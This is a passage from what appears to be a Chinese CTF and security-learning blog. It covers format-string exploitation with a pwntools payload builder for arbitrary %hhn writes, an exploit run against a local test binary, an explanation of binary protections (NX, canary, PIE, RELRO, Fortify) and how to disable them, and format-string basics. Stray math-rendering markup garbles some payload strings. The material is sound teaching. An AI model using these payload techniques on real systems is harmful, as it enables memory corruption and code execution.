<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMAIN-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="849" y="583"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1117" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="2118" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="2621" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3151" y="0"/>
 <use xlink:href="#E1-MJMAIN-32" x="3674" y="0"/>
<g transform="translate(4175,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>n&#x27;+pad3+&#x27;%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.19ex" height="2.843ex" style="vertical-align: -0.671ex;" viewbox="0 -934.9 5248.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">n'+pad4+'%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/>
<path stroke-width="1" id="E1-MJMAIN-34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="849" y="583"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1117" y="0"/>
 <use xlink:href="#E1-MJMATHI-70" x="2118" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="2621" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3151" y="0"/>
 <use xlink:href="#E1-MJMAIN-34" x="3674" y="0"/>
<g transform="translate(4175,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>n&#x27;<br></code></pre></td></tr></table></figure>

<p>我们可以依次进行计算。这里给出一个基本的构造，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br>payload = fmt_str(<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x0804A028</span>,<span class="hljs-number">0x12345678</span>)<br></code></pre></td></tr></table></figure>

<p>其中每个参数的含义基本如下</p>
<ul>
<li>offset表示要覆盖的地址最初的偏移</li>
<li>size表示机器字长</li>
<li>addr表示将要覆盖的地址。</li>
<li>target表示我们要覆盖为的目的变量值。</li>
</ul>
<p>相应的exploit如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./overwrite&#x27;</span>: pid <span class="hljs-number">78547</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="4.073ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 1753.5 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hhn%222c%7</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="576" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="1153" y="0"/>
</g>
</svg>hhn%222c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="4.073ex" height="2.176ex" style="vertical-align: -0.338ex;" viewbox="0 -791.3 1753.5 936.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hhn%222c%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="576" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="1153" y="0"/>
</g>
</svg>hhn<br>[*] Process <span class="hljs-string">&#x27;./overwrite&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">78547</span>)<br><span class="hljs-number">0xfff6f9bc</span><br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b <span class="hljs-keyword">for</span> a big number!<br></code></pre></td></tr></table></figure>

<p>当然，我们也可以利用%n分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用%hhn则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p>
]]></content>
      <tags>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区保护机制</title>
    <url>/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>为了更好地对缓冲区进行利用，十分有必要了解一下checksec所检查出的漏洞缓解措施都意味着什么</p>
<p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191658.png"></p>
<p>如图上所示，RELRO、Stack、NX、PIE四种保护机制，下方介绍时，括号里的是在Windows系统中的名称</p>
<p>以下主要来源于《从0到1CTFer成长之路》</p>
<h3 id="一、NX-DEP"><a href="#一、NX-DEP" class="headerlink" title="一、NX(DEP)"></a>一、NX(DEP)</h3><p>NX即是No-execute，不可执行。原理是通过现代操作系统的内存保护单元机制（MPU）对程序内存按页的粒度进行权限设置，其基本规则为<strong>可写权限与可执行权限互斥</strong>。因此开启了NX的程序代表着堆栈上写入的代码数据将不可被执行，也就无法直接通过溢出写入shellcode而执行任意代码。</p>
<p>所有可以被修改写入的数据的内存都不可执行，所有可执行的代码数据都是不可修改的。这就是可执行权限与可写权限互斥</p>
<p>GCC编写程序默认开启NX，关闭方法是在编译是加入**-z execstack参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z execstack -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="二、Stack-Canary"><a href="#二、Stack-Canary" class="headerlink" title="二、Stack Canary"></a>二、Stack Canary</h3><p>Stack Canary保护一种针对栈溢出攻击而设计的保护机制。当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，因此Stack Canary会在函数开始执行前，在返回地址前写入一个字长的随机数据（可以称这个数据为canary，在Windows下是cookie），之后可以在函数返回前进行检验随机数据是否被更改，如果发生更改将直接终止程序进行保护。</p>
<p>GCC编写程序默认开启Stack Canary，关闭方法是在编译时加入**-fno-stack-protector参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="三、PIE"><a href="#三、PIE" class="headerlink" title="三、PIE"></a>三、PIE</h3><p>在介绍PIE前，要先介绍ASLR即Address Space Layout Randomization，地址空间分布随机化。ASLR是系统等级的保护机制，只有在开启了ASLR后PIE才能生效。而ASLR的目的是将程序的堆栈地址和动态链接库（或称为共享库）的加载基址进行一定的随机化，这些地址之间是不可读写执行的未映射内存。</p>
<p>关闭ASLR关闭方式是修改**/proc/sys/kernel/randomize_va_space**文件为0</p>
<p>PIE的目的则是让可执行程序ELF文件的基址进行随机化加载（负责代码段和数据段的随机化），从而使得攻击者难以知道程序的内存结构，与ASLR相互配合。</p>
<p>GCC编写程序开启方法是加入**-fpic -pie参数<strong>。较新版本的GCC默认开启PIE，可以设置</strong>-no-pie**关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -fpic -pie -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="四、Full-Relro"><a href="#四、Full-Relro" class="headerlink" title="四、Full Relro"></a>四、Full Relro</h3><p>Full Relro 保护措施与Linux下的Lazy Binding机制有关，主要作用是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，禁止.GOT.PLT表和其他一些相关内存的读写，从而阻止攻击者直接进行修改程序所要执行的函数</p>
<ul>
<li>RELRO防御策略：<ul>
<li>为NO RELRO的时候，<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读可写</li>
<li>为PARTIAL RELRO的时候，<code>init.array</code>、<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写</li>
<li>为FULL RELRO时，<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code>均可读不可写。</li>
</ul>
</li>
</ul>
<p>GCC开启Full Relro 的方法是加入**-z relro参数**</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -z relro -o test test.c<br></code></pre></td></tr></table></figure>

<h3 id="五、Fortify"><a href="#五、Fortify" class="headerlink" title="五、Fortify"></a>五、Fortify</h3><p><img src="/2021/03/18/2021-03-18-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/QQ%E5%9B%BE%E7%89%8720210319191855.png"></p>
<p>这部分转载自<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E3%80%82">http://yunnigu.dropsec.xyz/2016/10/08/checksec及其包含的保护机制。</a></p>
<p>FORTIFY_SOURCE 机制对格式化字符串有两个限制</p>
<p> （1）包含 %n 的格式化字符串不能位于程序内存中的可写地址。</p>
<p>（2）当使用位置参数时，必须使用范围内的所有参数。</p>
<p>所以如果要使用 %7$x，你必须同时使用 1，2，3，4，5 和 6。</p>
<p>当进入到 gdb 中进行 checksec 检查文件会发现多了一个保护措施 Fortify，这是一种比较少见的保护措施，是为了防止缓冲区溢出攻击</p>
<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span> </span>&#123;<br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];<br>        <span class="hljs-built_in">strcpy</span>(buf, s);<br>        <span class="hljs-comment">/* Don&#x27;t allow gcc to optimise away the buf */</span><br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> :: <span class="hljs-string">&quot;m&quot;</span> (buf))</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>用包含参数-U_FORTIFY_SOURCE编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048450 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; 将0x118存储到栈上<br>  mov    0x8(%ebp),%eax     ; 将目标参数载入eax<br>  mov    %eax,0x4(%esp)     ; 保存目标参数<br>  lea    -0x108(%ebp),%eax  ; 数组buf<br>  mov    %eax,(%esp)        ; 保存<br>  call   8048320 &lt;strcpy@plt&gt;<br><br>  leave                     ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">08048470 &lt;fun&gt;:<br>  push   %ebp               ; <br>  mov    %esp,%ebp<br><br>  sub    $0x118,%esp        ; <br>  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存<br>  mov    0x8(%ebp),%eax     ; <br>  mov    %eax,0x4(%esp)     ; <br>  lea    -0x108(%ebp),%eax  ; <br>  mov    %eax,(%esp)        ; <br>  call   8048370 &lt;__strcpy_chk@plt&gt;<br><br>  leave                      ; <br>  ret<br></code></pre></td></tr></table></figure>

<p>可以看到 gcc 生成了一些附加代码，通过对数组大小的判断替换 strcpy，memcpy，memset 等函数名，达到防止缓冲区溢出的作用。</p>
]]></content>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="前提知识储备："><a href="#前提知识储备：" class="headerlink" title="前提知识储备："></a>前提知识储备：</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>格式化字符串函数可以接受<strong>可变数量</strong>的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
<ul>
<li>格式化字符串函数</li>
<li>格式化字符串</li>
<li>后续参数，就是下图中逗号后的变量（可以不要）</li>
</ul>
<p>上述可转为该图：</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf.png"></p>
<p>将相关正式概念代入图片更好理解</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>输入：</p>
<ul>
<li>scanf</li>
</ul>
<p>输出函数</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">基本介绍</th>
</tr>
</thead>
<tbody><tr>
<td align="center">printf</td>
<td align="center">输出到stdout</td>
</tr>
<tr>
<td align="center">fprintf</td>
<td align="center">输出到指定FILE流</td>
</tr>
<tr>
<td align="center">vprintf</td>
<td align="center">根据参数列表格式化输出到 stdout</td>
</tr>
<tr>
<td align="center">vfprintf</td>
<td align="center">根据参数列表格式化输出到指定FILE流</td>
</tr>
<tr>
<td align="center">sprintf</td>
<td align="center">输出到字符串</td>
</tr>
<tr>
<td align="center">snprintf</td>
<td align="center">输出指定字节数到字符串</td>
</tr>
<tr>
<td align="center">vsprintf</td>
<td align="center">根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td align="center">vsnprintf</td>
<td align="center">根据参数列表格式化输出指定字节到字符串</td>
</tr>
<tr>
<td align="center">setproctitle</td>
<td align="center">设置argv</td>
</tr>
<tr>
<td align="center">syslog</td>
<td align="center">输出日志</td>
</tr>
<tr>
<td align="center">err, verr, warn, vwarn等</td>
<td align="center">。。。</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><p>printf函数的字符串漏洞</p>
<p>此漏洞如（来自攻防世界的CGfsb）：</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/QQ%E5%9B%BE%E7%89%8720201205111442-1607139495232.png"></p>
</li>
</ul>
<p>在格式化字符串函数中%n，作用是把在%n前输出的字符个数赋值给对应的整型指针参数所指的变量</p>
<p>%hh的作用是限定输出格式为8位，即一个字节；</p>
<p>%h的作用是限定输出格式为16位，即两个字节；</p>
<p>%l的作用是限定输出格式为32位，即四个字节；</p>
<p>%ll的作用是限定输出格式为64位，即八个字节；</p>
<p>%L的作用是输出实数，支持long double类型；</p>
<ul>
<li><p>sprintf原型int sprintf(char *string, char *format [,argument,…])</p>
<ul>
<li><p><strong>string</strong>– 这是指向一个字符数组的指针，该数组存储了 C 字符串。</p>
</li>
<li><p><strong>format</strong>– 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是**%[flags] (width)[.precision] (length)specifier**</p>
</li>
<li><p>**[argument]…**：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</p>
</li>
</ul>
</li>
</ul>
<p>把格式化的数据写入某个字符串缓冲区。如果成功，则返回写入的字符总数（不包括’\0’），不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="x86系统下："><a href="#x86系统下：" class="headerlink" title="x86系统下："></a>x86系统下：</h3><p>以printf为例</p>
<p><img src="/2020/12/05/2020-12-05-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/printf-1608199588168.png"></p>
<p>假设printf函数将以图中方式进行输出。那么作为一个函数，首先就是将参数入栈，又按照从右到左的方式。那么将按以下的情况入栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">3.14<br>123456<br>addr of &quot;red&quot;<br>addr of format string: Color %s，Number %d，Float %4.2f<br></code></pre></td></tr></table></figure>

<p>执行printf函数后，函数会获取第一个参数，也就是格式化字符串。函数将会一个个的读取字符串中的字符，有以下情况：</p>
<ul>
<li>当前字符不是%，直接输出到相应标准输出。</li>
<li>当前字符是%， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是%,输出%；否则根据相应字符对应的数据类型，获取相应的参数，将其输出</li>
</ul>
</li>
</ul>
<p>那么漏洞将会发生在哪呢？</p>
<p>假设我们将程序写成这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>我们并没有提供printf函数中%后对应的参数，此时程序并不会报错停止，而是继续执行，会在栈中存储着格式化字符串地址上面的三个高地址变量解析，作为输出：</p>
<ul>
<li><p>%s则解析其地址对应的字符串</p>
</li>
<li><p>%d解析内容对应的整型值</p>
</li>
<li><p>%f解析内容对应的浮点值</p>
<p>第一个，注意！解析地址！如果是一个无法访问的地址比如0，那么程序将崩溃，这也是我们利用的点，比如注入不限量个%s，总有一个能让程序崩溃的。而其余两个我们也可以借此而使得栈上的内容泄露出来</p>
<p>这里补充一点：我们是可以获取栈中被视为第n+1个参数的值方法为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">%n$p<br></code></pre></td></tr></table></figure>

<p>n代表该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数了。</p>
